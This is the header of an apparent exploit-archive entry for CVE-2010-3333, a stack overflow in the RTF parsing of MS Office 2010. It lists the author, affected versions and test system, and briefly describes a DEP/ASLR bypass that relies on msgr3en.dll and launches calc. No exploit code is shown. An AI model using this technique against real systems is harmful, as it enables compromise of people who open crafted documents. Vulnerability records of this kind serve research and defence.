# Exploit Title: MS Office 2010 RTF Header Stack Overflow Vulnerability
Exploit
# Date: 7/3/2011
# Author: Snake ( Shahriyar.j < at > gmail )
# Version: MS Office <= 2010
# Tested on: MS Office 2010 ( 14.0.4734.1000) - Windows 7
# CVE : CVE-2010-3333

# This is the exploit I wrote for Abysssec "The Arashi" article.
# It gracefully bypass DEP/ASLR in MS Office 2010,
# and we named this method "Ikazuchi DEP/ASRL Bypass" : >
# unfortunately msgr3en.dll loads a few seconds after opining office,
# so just need to open open Office , and then open exploit after a few second and saw a nice calc.
